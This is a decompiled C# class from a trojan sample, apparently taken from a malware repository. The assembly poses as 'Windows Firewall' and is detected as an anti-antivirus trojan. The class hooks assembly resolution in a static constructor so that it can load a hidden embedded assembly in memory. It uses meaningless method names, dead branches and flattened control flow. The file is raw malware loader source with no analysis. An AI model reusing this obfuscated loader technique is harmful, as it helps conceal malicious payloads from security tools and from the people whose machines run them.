// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.DatabaseQueue
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using System;
using System.Reflection;

namespace WindowsFirewall
{
  internal class DatabaseQueue
  {
    private static readonly Assembly currentColor;

    static DatabaseQueue()
    {
      ActionProvider.SelectToolbox((object) FormStream.SelectToolbox(), new ResolveEventHandler(DatabaseQueue.IncreaseConnection));
      DirectoryInvoker.SelectToolbox((object) FormStream.SelectToolbox(), new ResolveEventHandler(DatabaseQueue.SelectToolbox));
      DatabaseQueue.currentColor = CommandDictionary.SelectToolbox(DatabaseQueue.SelectToolbox(AspectContext.SelectToolbox()));
    }

    internal static void SelectToolbox()
    {
    }

    private static Assembly SelectToolbox(
      object currentColor,
      ResolveEventArgs generatorPosition)
    {
      Assembly currentColor1 = AspectContext.SelectToolbox();
      string generatorPosition1 = DatabaseQueue.SelectToolbox(currentColor1);
      if (!BuilderDictionary.SelectToolbox((object) OptionsContext.SelectToolbox((object) generatorPosition), generatorPosition1))
        return (Assembly) null;
label_1:
      switch (6)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (DatabaseQueue.SelectToolbox);
          }
          return ProcessStack.SelectToolbox(IconType.SelectToolbox(97L, ClientService.SelectToolbox((object) currentColor1, generatorPosition1)));
      }
    }

    private static string SelectToolbox(Assembly currentColor)
    {
      string currentColor1 = MenuItemDictionary.SelectToolbox((object) currentColor);
      int nextData = FormDesigner.SelectToolbox((object) currentColor1, ',');
      if (nextData >= 0)
      {
label_1:
        switch (3)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (DatabaseQueue.SelectToolbox);
            }
            currentColor1 = ProcessProvider.SelectToolbox((object) currentColor1, 0, nextData);
            break;
        }
      }
      return EmulatorFactory.SelectToolbox((object) currentColor1, (object) '&');
    }

    private static Assembly IncreaseConnection(
      object currentColor,
      ResolveEventArgs generatorPosition)
    {
      if ((object) DatabaseQueue.currentColor == null)
        return DatabaseQueue.currentColor;
label_1:
      switch (4)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (DatabaseQueue.IncreaseConnection);
          }
          foreach (string currentColor1 in TextFileLoader.SelectToolbox((object) DatabaseQueue.currentColor))
          {
            if (DeviceInfo.SelectToolbox(currentColor1, OptionsContext.SelectToolbox((object) generatorPosition)))
            {
label_6:
              switch (7)
              {
                case 0:
                  goto label_6;
                default:
                  return DatabaseQueue.currentColor;
              }
            }
          }
label_10:
          switch (2)
          {
            case 0:
              goto label_10;
            default:
              return (Assembly) null;
          }
      }
    }
  }
}
